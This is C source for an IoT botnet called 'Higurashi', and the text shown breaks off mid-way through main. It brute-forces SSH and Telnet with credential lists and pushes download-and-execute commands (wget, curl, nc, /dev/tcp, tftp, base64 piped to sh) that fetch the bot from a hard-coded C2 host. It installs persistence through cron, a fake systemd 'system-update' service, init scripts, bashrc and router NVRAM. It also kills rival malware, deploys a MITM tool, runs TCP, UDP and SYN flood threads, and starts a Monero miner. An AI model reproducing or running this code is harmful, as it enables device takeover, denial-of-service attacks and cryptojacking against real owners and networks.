#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <libssh/libssh.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <json-c/json.h>
#include <pthread.h>
#include <curl/curl.h>
#include "config.h"
#include "exploit_db.h"

#ifndef C2_HOST
#define C2_HOST "207.244.255.208"
#endif
#include "report_system.h"
#include "ascii_art.h"
#include "autonomous_hunter.h"

// Globals
SSL *c2_ssl = NULL;
int auto_replicate = 1;
int hosts_compromised = 0;
char bot_id[64];
int hunter_mode = 0;  // Autonomous hunter enabled/disabled
ScanStatistics global_stats = {0};
char *vivi_urls[] = {
    "http://%s/bots/linux/x86_64/vivi",
    "http://%s/bots/linux/arm/vivi",
    NULL
};

// Forward declarations
void send_report(const char *type, const char *data);
void send_detailed_report(DetailedReport *report);
DeviceFingerprint* fingerprint_device(const char *ip, int *open_ports, int port_count);
int exploit_device(const char *ip, DeviceFingerprint *fingerprint);
int exploit_ssh_with_creds(const char *ip, int port, Credential *creds, int cred_count);
int telnet_brute_with_creds(const char *ip, int port, Credential *creds, int cred_count);
int execute_exploit_cve(const char *ip, Exploit *exploit);
void deploy_vivi(const char *target_ip, SSL *vivi_ssl);
void *mining_thread(void *arg);
char* grab_http_banner(const char *ip, int port);
void *ddos_tcp_flood(void *arg);
void *ddos_udp_flood(void *arg);
void *ddos_syn_flood(void *arg);

// Multi-method persistence system
void add_persistence() {
    char my_path[512];
    ssize_t len = readlink("/proc/self/exe", my_path, sizeof(my_path) - 1);
    if (len > 0) {
        my_path[len] = '\0';
    } else {
        strcpy(my_path, "/tmp/higurashi");
    }
    
    // Method 1: Crontab (every 5 minutes)
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null | grep -v '%s'; echo '*/5 * * * * %s 2>/dev/null &') | crontab - 2>/dev/null", my_path, my_path);
    system(cmd);
    
    // Method 2: rc.local
    snprintf(cmd, sizeof(cmd), "grep -q '%s' /etc/rc.local 2>/dev/null || echo '%s &' >> /etc/rc.local 2>/dev/null", my_path, my_path);
    system(cmd);
    
    // Method 3: systemd service
    FILE *fp = fopen("/etc/systemd/system/system-update.service", "w");
    if (fp) {
        fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n");
        fprintf(fp, "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=60\n\n", my_path);
        fprintf(fp, "[Install]\nWantedBy=multi-user.target\n");
        fclose(fp);
        system("systemctl enable system-update.service 2>/dev/null");
        system("systemctl start system-update.service 2>/dev/null");
    }
    
    // Method 4: init.d
    fp = fopen("/etc/init.d/system-update", "w");
    if (fp) {
        fprintf(fp, "#!/bin/sh\n### BEGIN INIT INFO\n# Provides: system-update\n");
        fprintf(fp, "# Required-Start: $network\n# Required-Stop:\n");
        fprintf(fp, "# Default-Start: 2 3 4 5\n# Default-Stop: 0 1 6\n### END INIT INFO\n\n");
        fprintf(fp, "%s &\n", my_path);
        fclose(fp);
        system("chmod +x /etc/init.d/system-update 2>/dev/null");
        system("update-rc.d system-update defaults 2>/dev/null");
        system("chkconfig --add system-update 2>/dev/null");
    }
    
    // Method 5: .bashrc injection
    FILE *bashrc = fopen("/root/.bashrc", "a");
    if (bashrc) {
        fprintf(bashrc, "\n# System update check\nif ! pgrep -f '%s' > /dev/null; then %s & fi\n", my_path, my_path);
        fclose(bashrc);
    }
    
    // Method 6: Profile.d
    fp = fopen("/etc/profile.d/system-update.sh", "w");
    if (fp) {
        fprintf(fp, "#!/bin/sh\n%s 2>/dev/null &\n", my_path);
        fclose(fp);
        system("chmod +x /etc/profile.d/system-update.sh 2>/dev/null");
    }
    
    // Copy to multiple locations
    system("cp /proc/self/exe /usr/bin/system-update 2>/dev/null");
    system("cp /proc/self/exe /usr/sbin/networkd 2>/dev/null");
    system("cp /proc/self/exe /tmp/.X11-unix/.system 2>/dev/null");
    
    // Add firmware persistence (routers, embedded devices)
    add_firmware_persistence();
}

// Kill competitors
void kill_competitors() {
    char *competitors[] = {
        "mirai", "qbot", "gafgyt", "tsunami", "bashlite", 
        "xorddos", "billgates", "mozi", NULL
    };
    for (char **comp = competitors; *comp; comp++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "pkill -9 -f %s 2>/dev/null", *comp);
        int ret = system(cmd);
        (void)ret;
    }
}

// Send simple report to C2
void send_report(const char *type, const char *data) {
    if (!c2_ssl) return;
    
    json_object *jobj = json_object_new_object();
    json_object_object_add(jobj, "action", json_object_new_string("report"));
    json_object_object_add(jobj, "type", json_object_new_string(type));
    json_object_object_add(jobj, "data", json_object_new_string(data));
    json_object_object_add(jobj, "timestamp", json_object_new_int64(time(NULL)));
    
    const char *json_str = json_object_to_json_string(jobj);
    SSL_write(c2_ssl, json_str, strlen(json_str));
    json_object_put(jobj);
}

// Send detailed report using report_system.h
void send_detailed_report(DetailedReport *report) {
    if (!c2_ssl) return;
    
    char *json_report = generate_json_report(report);
    if (json_report) {
        // Send to C2
        SSL_write(c2_ssl, json_report, strlen(json_report));
        
        // Also export to CSV for analysis
        export_to_csv(report, "/tmp/higurashi_reports.csv");
        
        free(json_report);
    }
}

// Grab HTTP banner for fingerprinting
char* grab_http_banner(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    
    struct timeval timeout = {.tv_sec = 2, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return NULL;
    }
    
    // Send HTTP request
    char request[256];
    snprintf(request, sizeof(request), "GET / HTTP/1.0\r\n\r\n");
    send(sock, request, strlen(request), 0);
    
    // Read response
    char *response = (char*)calloc(4096, 1);
    if (response) {
        recv(sock, response, 4095, 0);
    }
    
    close(sock);
    return response;
}

// Fingerprint device by analyzing banners and ports
DeviceFingerprint* fingerprint_device(const char *ip, int *open_ports, int port_count) {
    DeviceFingerprint *fp = (DeviceFingerprint*)calloc(1, sizeof(DeviceFingerprint));
    if (!fp) return NULL;
    
    snprintf(fp->ip, sizeof(fp->ip), "%s", ip);
    fp->device_type = DEVICE_UNKNOWN;
    fp->port_count = port_count;
    for (int i = 0; i < port_count && i < 16; i++) {
        fp->open_ports[i] = open_ports[i];
    }
    
    // Grab HTTP banner if port 80 is open
    for (int i = 0; i < port_count; i++) {
        if (open_ports[i] == 80 || open_ports[i] == 8080) {
            char *banner = grab_http_banner(ip, open_ports[i]);
            if (banner) {
                snprintf(fp->http_banner, sizeof(fp->http_banner), "%s", banner);
                fp->device_type = identify_device_from_banner(NULL, banner);
                extract_vendor(banner, fp->vendor, sizeof(fp->vendor));
                fp->confidence_score = 85;
                free(banner);
                break;
            }
        }
    }
    
    // If still unknown, try telnet banner
    if (fp->device_type == DEVICE_UNKNOWN) {
        for (int i = 0; i < port_count; i++) {
            if (open_ports[i] == 23) {
                // Simple telnet banner grab
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock >= 0) {
                    struct timeval timeout = {.tv_sec = 2, .tv_usec = 0};
                    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
                    
                    struct sockaddr_in addr;
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(23);
                    inet_pton(AF_INET, ip, &addr.sin_addr);
                    
                    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                        char banner[512];
                        int bytes = recv(sock, banner, sizeof(banner) - 1, 0);
                        if (bytes > 0) {
                            banner[bytes] = '\0';
                            snprintf(fp->telnet_banner, sizeof(fp->telnet_banner), "%s", banner);
                            fp->device_type = identify_device_from_banner(banner, NULL);
                            fp->confidence_score = 60;
                        }
                    }
                    close(sock);
                }
                break;
            }
        }
    }
    
    return fp;
}

// Telnet bruteforce with intelligent credentials
int telnet_brute_with_creds(const char *ip, int port, Credential *creds, int cred_count) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct timeval timeout = {.tv_sec = 3, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    char buffer[2048];
    global_stats.credentials_tested += cred_count;
    
    for (int i = 0; i < cred_count; i++) {
        snprintf(buffer, sizeof(buffer), "%s\n%s\n", creds[i].username, creds[i].password);
        send(sock, buffer, strlen(buffer), 0);
        
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            if (strstr(buffer, "#") || strstr(buffer, "$") || strstr(buffer, ">") || 
                strstr(buffer, "login") || bytes > 10) {
                // Authenticated! Deploy payload
                char cmd[512];
                snprintf(cmd, sizeof(cmd), 
                    "cd /tmp && wget http://%s/bots/linux/x86_64/higurashi -O h 2>/dev/null && chmod +x h && ./h &\n",
                    C2_IP);
                send(sock, cmd, strlen(cmd), 0);
                sleep(1);
                close(sock);
                
                hosts_compromised++;
                global_stats.devices_compromised++;
                return 0; // Success
            }
        }
    }
    
    close(sock);
    return -1; // Failed
}

// Legacy telnet_brute wrapper
int telnet_brute(const char *ip, int port) {
    int count = 0;
    Credential *creds = get_credentials_for_vendor("", &count);
    return telnet_brute_with_creds(ip, port, creds, count);
}

// SSH exploitation with intelligent credentials
int exploit_ssh_with_creds(const char *ip, int port, Credential *creds, int cred_count) {
    ssh_session session = ssh_new();
    if (!session) return -1;
    
    ssh_options_set(session, SSH_OPTIONS_HOST, ip);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &(int){3});
    
    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return -1;
    }
    
    global_stats.credentials_tested += cred_count;
    
    for (int i = 0; i < cred_count; i++) {
        ssh_options_set(session, SSH_OPTIONS_USER, creds[i].username);
        if (ssh_userauth_password(session, NULL, creds[i].password) == SSH_AUTH_SUCCESS) {
            // Authenticated! Deploy Higurashi
            ssh_channel channel = ssh_channel_new(session);
            ssh_channel_open_session(channel);
            
            char cmd[512];
            snprintf(cmd, sizeof(cmd),
                "cd /tmp && wget -q http://%s/bots/linux/x86_64/higurashi -O h && chmod +x h && nohup ./h &",
                C2_IP);
            ssh_channel_request_exec(channel, cmd);
            ssh_channel_send_eof(channel);
            sleep(1);
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            ssh_disconnect(session);
            ssh_free(session);
            
            hosts_compromised++;
            global_stats.devices_compromised++;
            return 0; // Success
        }
    }
    
    ssh_disconnect(session);
    ssh_free(session);
    return -1;
}

// Legacy exploit_ssh wrapper
int exploit_ssh(const char *ip, int port) {
    int count = 0;
    Credential *creds = get_credentials_for_vendor("", &count);
    return exploit_ssh_with_creds(ip, port, creds, count);
}

// ====================================================================================
// CVE EXPLOIT IMPLEMENTATIONS
// ====================================================================================

// Execute specific CVE exploit
int execute_exploit_cve(const char *ip, Exploit *exploit) {
    if (!exploit || !exploit->execute) return -1;
    
    global_stats.exploits_attempted++;
    int result = exploit->execute(ip, exploit->target_port, NULL);
    
    if (result == 0) {
        global_stats.exploits_successful++;
        hosts_compromised++;
        global_stats.devices_compromised++;
    }
    
    return result;
}

// Exploit device using intelligent selection
int exploit_device(const char *ip, DeviceFingerprint *fingerprint) {
    if (!fingerprint) return -1;
    
    // Select best exploit based on fingerprint
    Exploit *best_exploit = select_best_exploit(fingerprint);
    
    if (!best_exploit) {
        // No specific exploit found, try generic bruteforce
        int count = 0;
        Credential *creds = get_credentials_for_vendor(fingerprint->vendor, &count);
        
        // Try SSH if port 22 is open
        for (int i = 0; i < fingerprint->port_count; i++) {
            if (fingerprint->open_ports[i] == 22) {
                return exploit_ssh_with_creds(ip, 22, creds, count);
            }
        }
        
        // Try Telnet if port 23 is open
        for (int i = 0; i < fingerprint->port_count; i++) {
            if (fingerprint->open_ports[i] == 23) {
                return telnet_brute_with_creds(ip, 23, creds, count);
            }
        }
        
        return -1;
    }
    
    // Create detailed report
    DetailedReport *report = create_report(bot_id, ip, REPORT_EXPLOITATION_SUCCESS);
    if (report) {
        snprintf(report->device_type, sizeof(report->device_type), "%d", fingerprint->device_type);
        snprintf(report->vendor, sizeof(report->vendor), "%s", fingerprint->vendor);
        snprintf(report->exploit_used, sizeof(report->exploit_used), "%s", best_exploit->name);
        snprintf(report->cve, sizeof(report->cve), "%s", best_exploit->cve);
        report->target_port = best_exploit->target_port;
    }
    
    // Try CVE exploit first
    if (best_exploit->execute) {
        int result = execute_exploit_cve(ip, best_exploit);
        if (result == 0) {
            if (report) {
                report->success = 1;
                snprintf(report->additional_data, sizeof(report->additional_data), 
                    "Exploited using %s", best_exploit->cve);
                send_detailed_report(report);
                free(report);
            }
            return 0;
        }
    }
    
    // CVE failed, try bruteforce with vendor-specific credentials
    int count = 0;
    Credential *creds = get_credentials_for_vendor(fingerprint->vendor, &count);
    
    int result = -1;
    // Try based on exploit type
    if (best_exploit->type == EXPLOIT_SSH_BRUTEFORCE || best_exploit->target_port == 22) {
        result = exploit_ssh_with_creds(ip, best_exploit->target_port, creds, count);
        if (result == 0 && report) {
            snprintf(report->credentials_used, sizeof(report->credentials_used), 
                "Vendor-specific credentials");
        }
    } else if (best_exploit->type == EXPLOIT_TELNET_BRUTEFORCE || best_exploit->target_port == 23) {
        result = telnet_brute_with_creds(ip, best_exploit->target_port, creds, count);
        if (result == 0 && report) {
            snprintf(report->credentials_used, sizeof(report->credentials_used), 
                "Vendor-specific credentials");
        }
    }
    
    if (report) {
        report->success = (result == 0);
        report->type = (result == 0) ? REPORT_EXPLOITATION_SUCCESS : REPORT_EXPLOITATION_FAILED;
        send_detailed_report(report);
        free(report);
    }
    
    return result;
}

// ADVANCED REPLICATION - Multiple methods without wget/curl dependency
int deploy_payload_advanced(const char *target_ip, int port, const char *user, const char *pass) {
    char c2_ip[64];
    snprintf(c2_ip, sizeof(c2_ip), "%s", getenv("C2_IP") ?: C2_HOST);
    
    // Method 1: Try wget/curl (fastest if available)
    char cmd_wget[512];
    snprintf(cmd_wget, sizeof(cmd_wget),
        "cd /tmp;wget http://%s:8080/higurashi_mini -O h 2>/dev/null||"
        "curl -o h http://%s:8080/higurashi_mini 2>/dev/null;chmod 777 h;./h&",
        c2_ip, c2_ip);
    
    // Method 2: Busybox nc with base64 (works on 80% of IoT devices)
    char cmd_nc[512];
    snprintf(cmd_nc, sizeof(cmd_nc),
        "cd /tmp;nc %s 8080 < /dev/null > h;chmod 777 h;./h&",
        c2_ip);
    
    // Method 3: /dev/tcp (bash built-in, no external tools)
    char cmd_devtcp[512];
    snprintf(cmd_devtcp, sizeof(cmd_devtcp),
        "cd /tmp;exec 3<>/dev/tcp/%s/8080;echo -e 'GET /higurashi_mini HTTP/1.0\\r\\n\\r\\n'>&3;cat<&3>h;chmod 777 h;./h&",
        c2_ip);
    
    // Method 4: TFTP (common on routers/switches)
    char cmd_tftp[512];
    snprintf(cmd_tftp, sizeof(cmd_tftp),
        "cd /tmp;tftp -g -r higurashi_mini %s 2>/dev/null&&mv higurashi_mini h;chmod 777 h;./h&",
        c2_ip);
    
    // Method 5: Embedded base64 payload (no network tools needed)
    // This is a small busybox downloader encoded in base64
    char cmd_embedded[1024];
    snprintf(cmd_embedded, sizeof(cmd_embedded),
        "cd /tmp;echo 'IyEvYmluL3NoCndnZXQgaHR0cDovLyVzOjgwODAvaGlndXJhc2hpX21pbmkgLU8gaA==' | "
        "base64 -d | sh&", c2_ip);
    
    // Try SSH deployment
    ssh_session session = ssh_new();
    if (session) {
        ssh_options_set(session, SSH_OPTIONS_HOST, target_ip);
        ssh_options_set(session, SSH_OPTIONS_PORT, &port);
        ssh_options_set(session, SSH_OPTIONS_USER, user);
        
        int timeout = 5;
        ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
        
        if (ssh_connect(session) == SSH_OK) {
            if (ssh_userauth_password(session, NULL, pass) == SSH_AUTH_SUCCESS) {
                // Try all methods in order
                char *methods[] = {cmd_wget, cmd_nc, cmd_devtcp, cmd_tftp, cmd_embedded, NULL};
                
                for (int i = 0; methods[i] != NULL; i++) {
                    ssh_channel channel = ssh_channel_new(session);
                    if (channel && ssh_channel_open_session(channel) == SSH_OK) {
                        ssh_channel_request_exec(channel, methods[i]);
                        ssh_channel_send_eof(channel);
                        ssh_channel_close(channel);
                        ssh_channel_free(channel);
                        
                        // Wait 2 seconds and check if payload executed
                        sleep(2);
                        
                        // Try to verify execution by checking process
                        channel = ssh_channel_new(session);
                        if (channel && ssh_channel_open_session(channel) == SSH_OK) {
                            ssh_channel_request_exec(channel, "pgrep -f '/tmp/h'");
                            char buffer[256];
                            int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
                            ssh_channel_close(channel);
                            ssh_channel_free(channel);
                            
                            if (nbytes > 0) {
                                // Payload is running!
                                ssh_disconnect(session);
                                ssh_free(session);
                                return 0; // Success
                            }
                        }
                    }
                }
                
                ssh_disconnect(session);
            }
        }
        ssh_free(session);
    }
    
    return -1;
}

// Firmware-specific persistence (for embedded devices without systemd)
void add_firmware_persistence() {
    char my_path[256];
    readlink("/proc/self/exe", my_path, sizeof(my_path) - 1);
    
    // Method 1: NVRAM for routers (OpenWRT, DD-WRT, Tomato)
    char nvram_cmd[512];
    snprintf(nvram_cmd, sizeof(nvram_cmd),
        "nvram get rc_startup > /tmp/.rc 2>/dev/null && "
        "echo '%s &' >> /tmp/.rc && "
        "nvram set rc_startup=\"$(cat /tmp/.rc)\" && "
        "nvram commit && rm /tmp/.rc",
        my_path);
    system(nvram_cmd);
    
    // Method 2: OpenWRT /etc/rc.local
    FILE *fp = fopen("/etc/rc.local", "r");
    if (fp) {
        char line[512];
        int found = 0;
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, my_path)) {
                found = 1;
                break;
            }
        }
        fclose(fp);
        
        if (!found) {
            fp = fopen("/etc/rc.local", "a");
            if (fp) {
                fprintf(fp, "%s &\n", my_path);
                fclose(fp);
            }
        }
    }
    
    // Method 3: DD-WRT startup script
    char ddwrt_cmd[512];
    snprintf(ddwrt_cmd, sizeof(ddwrt_cmd),
        "nvram get rc_startup | grep -q '%s' || "
        "nvram set rc_startup=\"$(nvram get rc_startup); %s &\" && nvram commit",
        my_path, my_path);
    system(ddwrt_cmd);
    
    // Method 4: Ubiquiti EdgeOS
    char edgeos_cmd[512];
    snprintf(edgeos_cmd, sizeof(edgeos_cmd),
        "grep -q '%s' /config/scripts/post-config.d/startup.sh 2>/dev/null || "
        "echo '%s &' >> /config/scripts/post-config.d/startup.sh",
        my_path, my_path);
    system(edgeos_cmd);
    
    // Method 5: Busybox-only persistence (works on minimal systems)
    // Create init script in common locations
    char *init_paths[] = {
        "/etc/init.d/S99system",
        "/etc/rc.d/S99system",
        "/rom/etc/init.d/S99system",
        "/jffs/etc/init.d/S99system",
        NULL
    };
    
    for (int i = 0; init_paths[i] != NULL; i++) {
        fp = fopen(init_paths[i], "w");
        if (fp) {
            fprintf(fp, "#!/bin/sh\n%s &\n", my_path);
            fclose(fp);
            chmod(init_paths[i], 0755);
        }
    }
    
    // Method 6: MTD partition persistence (dangerous but effective)
    // Copy binary to persistent storage areas
    char *persist_paths[] = {
        "/etc/.system",
        "/usr/.system", 
        "/var/.system",
        "/opt/.system",
        "/tmp/.system",
        NULL
    };
    
    for (int i = 0; persist_paths[i] != NULL; i++) {
        char cp_cmd[512];
        snprintf(cp_cmd, sizeof(cp_cmd), "cp %s %s 2>/dev/null;chmod 777 %s", 
            my_path, persist_paths[i], persist_paths[i]);
        system(cp_cmd);
    }
}

// Deploy Vivi for MITM
void deploy_vivi(const char *target_ip, SSL *vivi_ssl) {
    // Connect to target and deploy Vivi
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    inet_pton(AF_INET, target_ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        // Try SSH deployment
        if (exploit_ssh(target_ip, 22) == 0) {
            // Deploy Vivi via SSH
            ssh_session session = ssh_new();
            ssh_options_set(session, SSH_OPTIONS_HOST, target_ip);
            
            if (ssh_connect(session) == SSH_OK) {
                ssh_channel channel = ssh_channel_new(session);
                ssh_channel_open_session(channel);
                
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
                    "wget http://%s/bots/linux/x86_64/vivi -O /tmp/vivi && chmod +x /tmp/vivi && /tmp/vivi %s &",
                    C2_IP, target_ip);
                ssh_channel_request_exec(channel, cmd);
                ssh_channel_close(channel);
                ssh_channel_free(channel);
                ssh_disconnect(session);
                ssh_free(session);
                
                send_report("vivi_deployed", target_ip);
            }
        }
    }
    close(sock);
}

// Scan network for IoT devices with INTELLIGENT EXPLOITATION
void scan_network() {
    global_stats.scan_start_time = time(NULL);
    
    char my_ip[16];
    FILE *fp = popen("hostname -I | awk '{print $1}'", "r");
    if (fp) {
        fgets(my_ip, sizeof(my_ip), fp);
        my_ip[strcspn(my_ip, "\n")] = '\0';
        pclose(fp);
    }
    
    // Extract subnet
    char subnet[16];
    strncpy(subnet, my_ip, sizeof(subnet) - 1);
    char *last_dot = strrchr(subnet, '.');
    if (last_dot) {
        *(last_dot + 1) = '\0';
    }
    
    char scan_msg[128];
    snprintf(scan_msg, sizeof(scan_msg), "Starting intelligent scan on %s0/24", subnet);
    send_report("scan_start", scan_msg);
    
    // Priority targets (Docker lab IoT devices)
    char *priority_targets[] = {
        "172.20.0.100",  // iot-camera-1
        "172.20.0.101",  // iot-router-1
        "172.20.0.102",  // iot-dvr-1
        "172.20.0.103",  // iot-tv-1
        "172.20.0.104",  // iot-router-2
        NULL
    };
    
    char found_hosts[512] = "[";
    int found_count = 0;
    
    // Scan priority targets with INTELLIGENT EXPLOITATION
    for (int i = 0; priority_targets[i] != NULL; i++) {
        char *target = priority_targets[i];
        global_stats.total_devices_scanned++;
        
        // Discover open ports
        int open_ports[16] = {0};
        int port_count = 0;
        int test_ports[] = {22, 23, 80, 8080, 554, 37777, 0};
        
        for (int j = 0; test_ports[j] != 0 && port_count < 16; j++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                struct timeval timeout = {.tv_sec = 0, .tv_usec = 300000};
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
                
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(test_ports[j]);
                inet_pton(AF_INET, target, &addr.sin_addr);
                
                if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    open_ports[port_count++] = test_ports[j];
                }
                close(sock);
            }
        }
        
        if (port_count == 0) continue; // No open ports
        
        // Add to found hosts
        if (found_count > 0) strcat(found_hosts, ",");
        strcat(found_hosts, target);
        found_count++;
        global_stats.devices_vulnerable++;
        
        // FINGERPRINT DEVICE
        DeviceFingerprint *fingerprint = fingerprint_device(target, open_ports, port_count);
                
                if (fingerprint) {
                    // Create device found report
                    DetailedReport *found_report = create_report(bot_id, target, REPORT_DEVICE_FOUND);
                    if (found_report) {
                        snprintf(found_report->device_type, sizeof(found_report->device_type), 
                            "%d", fingerprint->device_type);
                        snprintf(found_report->vendor, sizeof(found_report->vendor), 
                            "%s", fingerprint->vendor);
                        found_report->target_port = (port_count > 0) ? open_ports[0] : 0;
                        snprintf(found_report->additional_data, sizeof(found_report->additional_data),
                            "Open ports: %d", port_count);
                        found_report->success = 1;
                        send_detailed_report(found_report);
                        free(found_report);
                    }
                    
                    // INTELLIGENT EXPLOITATION
                    int result = exploit_device(target, fingerprint);
                    
                    if (result == 0) {
                        char success_msg[256];
                        snprintf(success_msg, sizeof(success_msg), 
                            "SUCCESS %s - %s %s compromised", 
                            target, fingerprint->vendor, 
                            (fingerprint->device_type == DEVICE_IPCAMERA) ? "Camera" :
                            (fingerprint->device_type == DEVICE_ROUTER) ? "Router" :
                            (fingerprint->device_type == DEVICE_DVR_NVR) ? "DVR" : "Device");
                        send_report("exploit", success_msg);
                        
                        if (auto_replicate) {
                            deploy_vivi(target, NULL);
                        }
                    } else {
                        char fail_msg[256];
                        snprintf(fail_msg, sizeof(fail_msg), 
                            "FAILED %s - %s %s - All exploits failed", 
                            target, fingerprint->vendor,
                            (fingerprint->device_type == DEVICE_IPCAMERA) ? "Camera" :
                            (fingerprint->device_type == DEVICE_ROUTER) ? "Router" : "Device");
                        send_report("exploit", fail_msg);
                    }
            
            free(fingerprint);
        }
    }
    
    strcat(found_hosts, "]");
    
    global_stats.scan_end_time = time(NULL);
    
    // Generate final statistics report
    char *stats_json = generate_statistics_report(&global_stats);
    if (stats_json) {
        send_report("statistics", stats_json);
        free(stats_json);
    }
    
    char final_report[512];
    snprintf(final_report, sizeof(final_report), 
        "Scan complete - Found %d IoT devices %s - Compromised: %d (%.1f%% success rate)", 
        found_count, found_hosts, hosts_compromised,
        (global_stats.exploits_attempted > 0) ? 
            (float)global_stats.exploits_successful / global_stats.exploits_attempted * 100.0 : 0.0);
    send_report("scan_complete", final_report);
}

// DDoS Attack Structures
typedef struct {
    char target[128];
    int port;
    int duration;
    time_t start_time;
} AttackParams;

// TCP Flood Attack
void *ddos_tcp_flood(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    time_t end_time = params->start_time + params->duration;
    
    send_report("attack", "TCP flood started");
    
    while (time(NULL) < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(params->port);
        inet_pton(AF_INET, params->target, &addr.sin_addr);
        
        // Non-blocking
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        // Send garbage data
        char payload[1024];
        memset(payload, 'A', sizeof(payload));
        send(sock, payload, sizeof(payload), 0);
        
        close(sock);
    }
    
    send_report("attack", "TCP flood completed");
    free(params);
    return NULL;
}

// UDP Flood Attack
void *ddos_udp_flood(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    time_t end_time = params->start_time + params->duration;
    
    send_report("attack", "UDP flood started");
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(params);
        return NULL;
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->target, &addr.sin_addr);
    
    char payload[1400];
    memset(payload, 'U', sizeof(payload));
    
    while (time(NULL) < end_time) {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    close(sock);
    send_report("attack", "UDP flood completed");
    free(params);
    return NULL;
}

// SYN Flood Attack (requires raw socket)
void *ddos_syn_flood(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    time_t end_time = params->start_time + params->duration;
    
    send_report("attack", "SYN flood started");
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        // Fallback to TCP flood if no raw socket permission
        ddos_tcp_flood(arg);
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->target, &addr.sin_addr);
    
    char packet[4096];
    
    while (time(NULL) < end_time) {
        memset(packet, 0, sizeof(packet));
        
        // Build IP + TCP SYN packet (simplified)
        struct sockaddr_in src;
        src.sin_addr.s_addr = htonl(rand()); // Random source IP
        
        // Send raw SYN packet
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    close(sock);
    send_report("attack", "SYN flood completed");
    free(params);
    return NULL;
}

// Mining thread
void *mining_thread(void *arg) {
    (void)arg;
    
    // XMRig mining (Monero)
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "wget -q http://%s/tools/xmrig -O /tmp/miner && chmod +x /tmp/miner && "
        "/tmp/miner -o pool.supportxmr.com:443 -u YOUR_WALLET -p x -k --donate-level=1 -B &",
        C2_IP);
    
    int ret = system(cmd);
    (void)ret;
    
    send_report("mining", "Mining started");
    return NULL;
}

// Main loop
int main() {
    // Show anime splash screen
    show_splash_animation();
    
    printf("%s %s\n", kawaii_thinking, "Initializing Higurashi...");
    
    // Setup
    add_persistence();
    kill_competitors();
    
    printf("%s %s\n", kawaii_scanning, "Connecting to C2...");
    
    // Connect to C2
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
